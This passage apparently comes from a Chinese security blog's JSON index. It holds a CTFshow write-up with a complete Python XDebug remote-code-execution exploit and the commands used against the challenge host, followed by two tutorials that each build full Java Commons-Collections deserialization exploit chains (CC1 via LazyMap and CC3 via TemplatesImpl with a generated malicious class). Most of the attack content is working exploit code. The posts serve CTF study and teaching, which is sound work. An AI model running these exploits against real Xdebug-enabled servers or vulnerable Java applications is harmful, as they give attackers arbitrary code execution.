123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/usr/bin/env python3import reimport sysimport timeimport requestsimport argparseimport socketimport base64import binasciiimport socketserverimport threadingimport logginglogging.basicConfig(stream=sys.stdout, level=logging.INFO, format='%(levelname)s - %(message)s')server_done = threading.Event()server_started = threading.Event()def recv_xml(sock: socket.socket) -&gt; bytes: blocks = [] data = b'' while True: try: data = data + sock.recv(1024) except socket.error as e: break if not data: break while data: eop = data.find(b'\\x00') if eop &lt; 0: break blocks.append(data[:eop]) data = data[eop+1:] if len(blocks) &gt;= 4: break return blocks[3]class XDebugRequestHandler(socketserver.BaseRequestHandler): def handle(self): logging.info('[+] Recieve data from %s', self.client_address) self.request.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(self.server.code.encode()), b'\\x00'])) data = recv_xml(self.request) logging.info('[+] Recieve data: ' + data.decode()) g = re.search(rb'&lt;\\!\\[CDATA\\[([a-z0-9=\\./\\+]+)\\]\\]&gt;', data, re.I) if not g: logging.warning('[-] No result...') return data = g.group(1) try: logging.info('[+] Result: ' + base64.b64decode(data).decode()) server_done.set() except binascii.Error as e: logging.error('[-] May be not string result: %s', e)class XDebugServer(socketserver.ThreadingMixIn, socketserver.TCPServer): def __init__(self, server_address, handler_class, code): self.code = code self.allow_reuse_address = True super().__init__(server_address, handler_class) def server_activate(self): super().server_activate() logging.info('[+] Server %s started', self.server_address) server_started.set()def start_dbgp_server(port: int, code: str): server = XDebugServer(('0.0.0.0', port), XDebugRequestHandler, code) server_thread = threading.Thread(target=server.serve_forever, daemon=True) server_thread.start() return server_threaddef trigger_debug_session(url: str, attack_ip: str): try: server_started.wait(timeout=5) logging.info('[+] Trigger debug session') headers = { 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0' } if attack_ip: headers['X-Forwarded-For'] = attack_ip requests.get(url + '?XDEBUG_SESSION_START=phpstorm&amp;XDEBUG_SESSION=1&amp;XDEBUG_TRIGGER=1', headers=headers, timeout=5) except: passdef main(): parser = argparse.ArgumentParser(description='XDebug remote debug code execution.') parser.add_argument('-c', '--code', required=True, help='the code you want to execute.') parser.add_argument('-t', '--target', required=True, help='target url.') parser.add_argument('--dbgp-ip', default='', help='dbgp server ip address, must can be accessed from target server.') args = parser.parse_args() start_dbgp_server(9000, args.code) start_dbgp_server(9003, args.code) threading.Thread(target=trigger_debug_session, args=(args.target, args.dbgp_ip), daemon=True).start() try: # Wait with a timeout, but check for interrupts for i in range(20): if server_done.is_set(): break time.sleep(0.5) else: logging.error('[-] Execution timed out') except KeyboardInterrupt: logging.info('[*] Received keyboard interrupt, exiting...')if __name__ == '__main__': main() 然后执行命令，这里用题目给的备用地址http://pwn.challenge.ctf.show:28100/ 1python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c 'shell_exec(&quot;ls&quot;);' cat flaaaxx.php即可，成功拿到flag 1python3 exp.py -t http://pwn.challenge.ctf.show:28100/index.php -c 'shell_exec(&quot;cat flaaaxx.php&quot;);' 1ctfshow{8838-562d8118-4706-427f-8be2-a89a45c752cb}","link":"/posts/ctfshow-phpcve-web311-web315/"},{"title":"Java反序列化 CC1链分析 (LazyMap)","text":"前言前面我们介绍了TransformedMap的构造链，这条链易于理解，适合快速构造验证。今天我们来对之前的内容做补充，讲一下LazyMap这条构造链，该链是ysoserial中CC1链的构造方式，相比于TransformedMap的构造链，LazyMap链结构相对复杂但更灵活、扩展性强，LazyMap作为CC1的代表，其核心是懒加载和灵活插入的transform操作 链子有一部分跟之前TransformedMap构造链一样，如果忘记了如何构造，可以看看文章：Java反序列化 CC1链分析 先放个TransformedMap链的图回忆一下 初步探索首先，我们先找哪些地方调用了transform，可以回到Transformer.java中alt+F7查找用法 之前我们走的是TransformedMap.checkSetValue()，这次我们就不走这个了，走LazyMap的get方法 要求满足map.containsKey(key) == false才可以进入if语句调用transform，也就是要求map里面没有对应的key键名 接着我们看看LazyMap的构造方法 可以传入factory，也就是get方法里的factory是可控的，但是该构造方法被protected修饰，不能直接调用，我们继续往下分析 发现decorate方法返回了构造方法实例，且是public修饰，符合我们的要求 我们尝试构造代码，最后那里跟CC1调用ChainedTransformer()和InvokerTransformer()那部分一样 12345678910111213141516public class Main { public static void main(String[] args) throws Exception { Class cs = Runtime.class; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map decorate = LazyMap.decorate(map, chainedTransformer); decorate.get(&quot;key&quot;); }} 成功弹出计算器 逐步完善接下来我们就是要找哪里调用了get方法，alt+F7查找用法 get方法的调用点非常多，有好几千个，在ysoserial工具中，作者最终使用了AnnotationInvocationHandler类作为触发get方法的关键跳板，其中的invoke里调用了get方法 为了能顺利调用get方法，我们需要绕过前面的两个if语句 首先是第一个 1if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) 我们只要调用的方法名不为equals就好 第二个 1if (paramTypes.length != 0) 要长度为0绕过，我们调用无参方法即可 然后我们分析构造函数 发现memberValues可控，但是该构造函数没有修饰符在前面，也就是为默认的Package-local类型，无法直接外部调用，那我们可以用反射来实现 接下来就是看看如何触发invoke方法，我们来到开头这里，看到AnnotationInvocationHandler类实现了InvocationHandler接口 实现了InvocationHandler接口，表示该类可以作为动态代理的代理处理器，当调用代理对象的方法就会自动跳转到该类重写后的invoke方法执行，也就是我们前面提到的那个invoke，实现逻辑增强 如果对动态代理的概念不太熟悉，可以看看这两篇文章： 动态代理 - Java教程 - 廖雪峰的官方网站 Java动态代理实现全解析：原理、实战与最佳实践 这样如何触发invoke的问题就解决了，我们把AnnotationInvocationHandler作为代理处理器就可以，剩下要解决的问题就是如何调用无参方法 我们继续分析AnnotationInvocationHandler类，发现readObject方法里调用了无参方法，刚好这里还是反序列化的入口，一举两得 可以看到for循环里面对memberValues调用了无参方法entrySet()，而entrySet()是Map接口的一个抽象方法，且LazyMap是实现了Map接口的，符合我们的要求 接下来我们来构造代码，先通过反射创建AnnotationInvocationHandler的构造实例，注意类型要强制转换为InvocationHandler 1234Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class);annotationConstructor.setAccessible(true);InvocationHandler handler = (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate); 然后利用Proxy.newProxyInstance()创建Map接口的代理对象，设置handler为其代理处理器。接着再实例化构造器annotationConstructor，注解类我们随便传个Override，然后Map设置为proxy，完成闭环 12Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler);Object o = annotationConstructor.newInstance(Override.class, proxy); 为了方便理解，我们放个图，这就是LazyMap的构造链 最终利用根据前面的内容，我们把代码结合起来，得到完整exp 1234567891011121314151617181920212223242526272829303132333435public class Main { public static void main(String[] args) throws Exception { Class cs = Runtime.class; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map decorate = LazyMap.decorate(map, chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate); Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler); Object o = annotationConstructor.newInstance(Override.class, proxy); serialize(o); unserialize(&quot;cc1.ser&quot;); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.ser&quot;)); oos.writeObject(obj); } public static void unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); }} 成功弹出计算器 至此，CC1的LazyMap链分析完成","link":"/posts/java-cc1-gadget-chain-analysis-lazymap/"},{"title":"Java反序列化 CC3链分析","text":"前言如果你学习了CC1和CC2，会发现CC3跟前两个很像，其实CC3链复用了CC1的触发机制，但替换了最终的执行payload，改为动态类加载执行任意代码，建议先看看前两篇文章，后面理解起来也会更容易 Java反序列化 CC1链分析 (LazyMap) Java反序列化 CC2链分析 环境准备咱们待会用javassist来动态生成恶意类，所以修改pom.xml文件如下，当然也可以不用javassist，我们留在最后面来讲讲 123456789101112&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.javassist&lt;/groupId&gt; &lt;artifactId&gt;javassist&lt;/artifactId&gt; &lt;version&gt;3.22.0-GA&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 然后在Maven同步项目即可 初步探索CC3的命令执行方式为动态类加载，利用点在defineClass()方法这里 Java中的defineClass方法，作用是将传入的字节码数据转换成JVM中可运行的Java类对象，也就是负责将一段字节流（通常是编译后的class字节码）转换成java.lang.Class实例并返回对应的Class对象 然后我们alt+F7查找用法，发现TemplatesImpl类调用了defineClass()方法 继续查找用法，看看defineClass在该类的哪里被使用，发现被defineTransletClasses方法调用 那我们跟进这个方法，来详细分析一下 有很多条件，咱们一个个来分析 要求_bytecodes不为null，后面会遍历_bytecodes数组进行类加载，_bytecodes就传入我们的恶意字节码 接着是调用_tfactory的getExternalExtensionsMap()方法，这就要求_tfactory不为null，但是我们看看定义 发现_tfactory被transient修饰，也就是当对象序列化时，该成员变量不会跟着被序列化，该变量在新对象里会变成默认值null，那怎么办 我们继续分析，发现readObject方法里对_tfactory初始化了，那我们就可以不用管这个了 接着就是最后一个条件，要求父类为ABSTRACT_TRANSLET，通过则_transletIndex = i，在这里也就是0，因为_transletIndex默认为-1，所以这一步我们不能跳过 解决完问题后，我们继续分析，因为defineTransletClasses为private，所以我们往上看看哪里有调用这个方法 查找用法，发现getTransletInstance调用了该方法，要求_name不为null且_class要等于null，_name我们随便传个值就好。但是该方法还是private，还得继续往上找 继续分析，发现newTransformer方法调用了getTransletInstance，同时还是public修饰符，那问题就解决了 我们尝试编写测试代码验证，先用Javassist动态生成恶意类，然后转化为字节码byte数组，跟CC2的链2一样，具体可以看Java反序列化 CC2链分析 12345678910111213141516// 获取javassist类池，插入AbstractTranslet类所在的路径，然后创建新的空类EvilClassPool pool = ClassPool.getDefault();pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));CtClass cc = pool.makeClass(&quot;Evil&quot;);// 在静态初始化块中插入恶意命令代码，需要用到 makeClassInitializer()String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;;cc.makeClassInitializer().insertBefore(cmd);// 继承AbstractTranslet类cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));// 避免文件名重复String rename = &quot;Evil&quot; + System.nanoTime();cc.setName(rename);cc.writeFile();// 将动态类转为字节码byte数组byte[] bytes = cc.toBytecode();byte[][] targetByteCodes = new byte[][]{bytes}; 实例化后效果如下 为了节省位置，咱们写个函数setFieldValue来实现反射，测试exp如下 12345678910111213141516171819202122232425262728293031public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); String rename = &quot;Evil&quot; + System.nanoTime(); cc.setName(rename); cc.writeFile(); byte[] bytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{bytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); // 因为这里不是反序列化，没有触发readObject，所以_tfactory要利用反射设置值为TransformerFactoryImpl对象 // 后面完整的exp就不需要写这个了 setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl()); templates.newTransformer(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }} 成功弹出计算器 逐步完善接下来就是寻找如何触发newTransformer，发现TrAXFilter类调用了该方法 然后我们想办法实例化这个类，传入参数templates，这里CC3作者找到了InstantiateTransformer类来实例化对象，我们分析一下 可以看到尝试获取构造器并进行实例化，那我们给InstantiateTransformer.transform()传入TrAXFilter.class即可，怎么传呢，咱们用ChainedTransformer和ConstantTransformer，接下来的方法跟CC1的LazyMap链一样，因为篇幅比较长，这里就不讲了，可以参考文章Java反序列化 CC1链分析 (LazyMap) 为了更直观的感受，这里放个CC3的图 最终利用综上，我们构造完整exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(&quot;Evil&quot;); String cmd = &quot;java.lang.Runtime.getRuntime().exec(\\&quot;calc.exe\\&quot;);&quot;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); String rename = &quot;Evil&quot; + System.nanoTime(); cc.setName(rename); cc.writeFile(); byte[] bytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{bytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); Class cs = TrAXFilter.class; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map decorate = LazyMap.decorate(map, chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate); Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler); Object o = annotationConstructor.newInstance(Override.class, proxy); try{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc3.ser&quot;)); objectOutputStream.writeObject(o); objectOutputStream.close(); }catch (Exception e){ e.printStackTrace(); } try{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc3.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }} 成功弹出计算器 手工构建恶意类如果我们不用Javassist的话，就需要手工构建恶意类，然后生成class 这时候pom.xml就不需要添加Javassist依赖了 1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 因为恶意类要继承AbstractTranslet，这就需要我们去实现transform抽象方法，否则会报错，当然也可以用IDEA自动添加，更方便 构建代码如下，要写静态代码static，因为存在静态初始化方法的类，在该类首次被加载并初始化时执行一次，如反射、创建实例、访问静态成员等，该方法都会被自动调用 1234567891011121314151617181920212223242526import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public class Evil extends AbstractTranslet { static { try { Runtime.getRuntime().exec(&quot;calc&quot;); } catch (IOException e) { throw new RuntimeException(e); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 然后用Java8执行命令，构建class文件 1javac Evil.java 接着修改我们之前的exp，把Javassist动态生成类的那一部分替换成读取我们的恶意类路径，例如 12byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\test\\\\Evil.class&quot;));byte[][] targetByteCodes = new byte[][]{bytes}; 完整代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051public class Main { public static void main(String[] args) throws Exception { byte[] bytes = Files.readAllBytes(Paths.get(&quot;E:\\\\test\\\\Evil.class&quot;)); byte[][] targetByteCodes = new byte[][]{bytes}; TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, &quot;_name&quot;, &quot;test&quot;); setFieldValue(templates, &quot;_class&quot;, null); setFieldValue(templates, &quot;_bytecodes&quot;, targetByteCodes); Class cs = TrAXFilter.class; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(cs), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map decorate = LazyMap.decorate(map, chainedTransformer); Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor annotationConstructor = c.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) annotationConstructor.newInstance(Override.class, decorate); Map proxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, handler); Object o = annotationConstructor.newInstance(Override.class, proxy); try{ ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc3.ser&quot;)); objectOutputStream.writeObject(o); objectOutputStream.close(); }catch (Exception e){ e.printStackTrace(); } try{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(&quot;cc3.ser&quot;)); objectInputStream.readObject(); objectInputStream.close(); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }} 成功弹出计算器","link":"/posts/java-cc3-gadget-chain-analysis/"}],"tags":[{"name":"Java安全","slug":"Java安全","link":"/tags/Java%E5%AE%89%E5%85%A8/"},{"name":"Python安全","slug":"Python安全","link":"/tags/Python%E5%AE%89%E5%85%A8/"},{"name":"应急响应","slug":"应急响应","link":"/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"玄机靶场","slug":"玄机靶场","link":"/tags/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/tags/CTFSHOW/"},{"name":"CTF赛事","slug":"CTF赛事","link":"/tags/CTF%E8%B5%9B%E4%BA%8B/"},{"name":"工具推荐","slug":"工具推荐","link":"/tags/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"categories":[{"name":"Java安全","slug":"Java安全","link":"/categories/Java%E5%AE%89%E5%85%A8/"},{"name":"Python安全","slug":"Python安全","link":"/categories/Python%E5%AE%89%E5%85%A8/"},{"name":"玄机靶场","slug":"玄机靶场","link":"/categories/%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/"},{"name":"CTFSHOW","slug":"CTFSHOW","link":"/categories/CTFSHOW/"},{"name":"CTF赛事","slug":"CTF赛事","link":"/categories/CTF%E8%B5%9B%E4%BA%8B/"},{"name":"工具推荐","slug":"工具推荐","link":"/categories/%E5%B7%A5%E5%85%B7%E6%8E%A8%E8%8D%90/"}],"pages":[]}